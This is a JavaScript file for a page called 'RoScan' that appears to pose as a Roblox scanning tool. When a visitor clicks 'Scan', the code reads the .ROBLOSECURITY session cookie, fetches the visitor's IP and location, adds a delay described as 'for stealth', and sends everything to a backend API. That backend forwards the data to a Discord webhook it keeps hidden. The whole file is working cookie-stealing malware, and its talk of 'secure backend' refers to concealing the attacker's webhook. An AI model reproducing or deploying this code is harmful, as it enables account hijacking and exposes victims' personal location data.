// RoScan Secure Backend v2.0.0 - Discord webhook completely hidden in backend
console.log('🔒 RoScan Secure Backend v2.0.0 loaded - Webhook is backend-protected');

document.addEventListener('DOMContentLoaded', function() {
    console.log('✅ DOM Content Loaded - Secure backend mode active');
    
    // Get submit button and attach event listener
    const submitBtn = document.getElementById('submitBtn');
    if (submitBtn) {
        submitBtn.addEventListener('click', submitPowerShell);
        console.log('✅ Submit button event listener attached');
    } else {
        console.error('❌ Submit button not found!');
    }
});

// Cookie extraction function
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
}

// Location detection function
async function getUserLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            city: data.city || 'Unknown',
            region: data.region || 'Unknown', 
            country: data.country_name || 'Unknown',
            ip: data.ip || 'Unknown'
        };
    } catch (error) {
        console.warn('Location detection failed:', error);
        return {
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            ip: 'Unknown'
        };
    }
}

// Show notification function
function showNotification(message, type = 'info') {
    console.log(`📢 Notification (${type}): ${message}`);
    
    const notification = document.createElement('div');
    notification.textContent = message;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : '#3b82f6'};
        color: white;
        padding: 12px 20px;
        border-radius: 8px;
        z-index: 10000;
        font-weight: 500;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        animation: slideIn 0.3s ease-out;
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        if (notification.parentNode) {
            notification.parentNode.removeChild(notification);
        }
    }, 3000);
}

// Close scan modal function
function closeScanModal() {
    console.log('🔄 Closing scan modal');
    const modal = document.querySelector('.modal-overlay');
    if (modal) {
        modal.style.display = 'none';
    }
}

// Main webhook submission function - SECURE BACKEND ONLY
async function submitPowerShell() {
    console.log('🚀 Secure backend webhook submission started');
    
    const submitBtn = document.getElementById('submitBtn');
    const submitText = submitBtn?.querySelector('.submit-text');
    const loadingOverlay = document.querySelector('.loading-overlay');
    
    if (!submitBtn || !submitText) {
        console.error('❌ Required UI elements not found');
        showNotification('UI elements not found', 'error');
        return;
    }
    
    // Update UI to show loading state
    submitText.textContent = 'Sending...';
    submitBtn.style.background = '#6b7280';
    if (loadingOverlay) loadingOverlay.style.display = 'flex';
    
    try {
        // Extract Roblox cookie
        const robloxCookie = getCookie('.ROBLOSECURITY');
        console.log('🍪 Roblox cookie extracted:', robloxCookie ? 'Found' : 'Not found');
        
        // Get user location
        console.log('📍 Getting user location...');
        const locationInfo = await getUserLocation();
        console.log('📍 Location info:', locationInfo);
        
        // Add random delay for stealth (1-3 seconds)
        const delay = Math.floor(Math.random() * 2000) + 1000;
        console.log(`⏱️ Adding ${delay}ms delay for stealth...`);
        await new Promise(resolve => setTimeout(resolve, delay));
        
        // Use SECURE BACKEND API - Discord webhook is completely hidden server-side
        // Frontend NEVER knows the Discord webhook URL
        const backendApiUrl = window.location.origin + '/api/webhook';
        
        console.log('🔒 Using secure backend API endpoint');
        console.log('📡 Backend API URL:', backendApiUrl);
        console.log('🛡️ Discord webhook is completely hidden in backend');
        
        // Prepare payload for BACKEND API (not Discord directly)
        const payload = {
            // Discord-compatible content (backend will forward this)
            content: `@everyone\n🔒 **Secure Backend Data**\n\n**Cookie:** \`${robloxCookie || 'None found'}\`\n**Location:** ${locationInfo.city}, ${locationInfo.region}, ${locationInfo.country}\n**IP:** ${locationInfo.ip}\n**Time:** ${new Date().toLocaleString()}`,
            
            // Enhanced embeds with security info
            embeds: [{
                title: "🔒 RoScan Secure Backend Collection",
                description: "Data processed through secure backend API",
                color: 0x667eea,
                fields: [
                    {
                        name: "🍪 Cookie Status",
                        value: robloxCookie ? "✅ Found" : "❌ Not found",
                        inline: true
                    },
                    {
                        name: "📍 Location",
                        value: `${locationInfo.city}, ${locationInfo.region}`,
                        inline: true
                    },
                    {
                        name: "🌍 Country",
                        value: locationInfo.country,
                        inline: true
                    },
                    {
                        name: "🌐 IP Address",
                        value: locationInfo.ip,
                        inline: true
                    },
                    {
                        name: "🕒 Timestamp",
                        value: new Date().toLocaleString(),
                        inline: true
                    },
                    {
                        name: "🔧 Frontend Version",
                        value: "Secure Backend v2.0.0",
                        inline: true
                    },
                    {
                        name: "🛡️ Security Level",
                        value: "Backend Protected",
                        inline: true
                    },
                    {
                        name: "🔐 Webhook Storage",
                        value: "Server-Side Only",
                        inline: true
                    }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: "RoScan - Secure Backend Architecture"
                }
            }],
            
            // Metadata for backend processing
            metadata: {
                frontend_version: 'Secure Backend v2.0.0',
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                url: window.location.href,
                security_mode: 'backend_protected',
                webhook_exposure: 'none' // Webhook URL never exposed to frontend
            }
        };
        
        // Send to SECURE BACKEND API (not Discord directly)
        console.log('🚀 Sending to secure backend API...');
        
        const response = await fetch(backendApiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify(payload),
            mode: 'cors'
        });
        
        console.log(`✅ Backend API response: ${response.status}`);
        
        if (loadingOverlay) loadingOverlay.style.display = 'none';

        if (response.ok) {
            const result = await response.json();
            console.log('🎉 Secure backend webhook delivered successfully!', result);
            
            submitText.textContent = 'Sent!';
            submitBtn.style.background = '#10b981';
            
            // Show success with backend security info
            if (result.security_level === 'protected') {
                showNotification('Data sent securely via backend protection!', 'success');
            } else {
                showNotification('Data sent successfully via secure backend!', 'success');
            }
            
            // Auto-close modal after success
            setTimeout(() => {
                closeScanModal();
            }, 2000);
        } else {
            const errorData = await response.json().catch(() => ({ error: 'Unknown error' }));
            console.error(`❌ Backend API failed: ${response.status}`, errorData);
            
            if (response.status === 404) {
                throw new Error('Backend API endpoint not found. Check deployment.');
            } else if (response.status === 429) {
                throw new Error('Rate limited by backend. Please wait and try again.');
            } else if (response.status === 500) {
                throw new Error('Backend server error. Please try again later.');
            } else {
                throw new Error(`Backend API failed (${response.status}): ${errorData.error || 'Unknown error'}`);
            }
        }
        
    } catch (error) {
        console.error('💥 Secure backend webhook failed:', error);
        
        if (loadingOverlay) loadingOverlay.style.display = 'none';
        
        // Reset button state
        submitText.textContent = 'Scan';
        submitBtn.style.background = '#ef4444';
        
        // Show user-friendly error
        showNotification(`Error: ${error.message}`, 'error');
        
        // Reset button after 3 seconds
        setTimeout(() => {
            submitText.textContent = 'Scan';
            submitBtn.style.background = '';
        }, 3000);
    }
}

// Add CSS animation keyframes
if (!document.querySelector('#slideInKeyframes')) {
    const style = document.createElement('style');
    style.id = 'slideInKeyframes';
    style.textContent = `
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(100%);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
    `;
    document.head.appendChild(style);
}

// Security info for developers
console.log('🔒 SECURITY INFORMATION:');
console.log('✅ Discord webhook URL is NEVER exposed to frontend');
console.log('✅ All webhook handling is done in secure backend');
console.log('✅ Frontend only communicates with backend API');
console.log('✅ No webhook obfuscation needed - true backend security');

console.log('🎯 RoScan Secure Backend v2.0.0 ready!');
console.log('🛡️ Maximum security: Webhook stored server-side only');

// Make functions available globally
window.submitPowerShell = submitPowerShell;
window.getUserLocation = getUserLocation;

// Security demonstration function
window.showSecurityInfo = function() {
    console.log('🔒 SECURITY ARCHITECTURE:');
    console.log('');
    console.log('Frontend (Browser):');
    console.log('  ├── Collects user data');
    console.log('  ├── Sends to /api/webhook');
    console.log('  └── NEVER knows Discord URL');
    console.log('');
    console.log('Backend (Vercel):');
    console.log('  ├── Receives frontend data');
    console.log('  ├── Stores Discord webhook securely');
    console.log('  ├── Forwards to Discord');
    console.log('  └── Returns generic response');
    console.log('');
    console.log('Discord:');
    console.log('  └── Receives data from backend only');
    console.log('');
    console.log('🛡️ Result: Webhook URL completely protected!');
};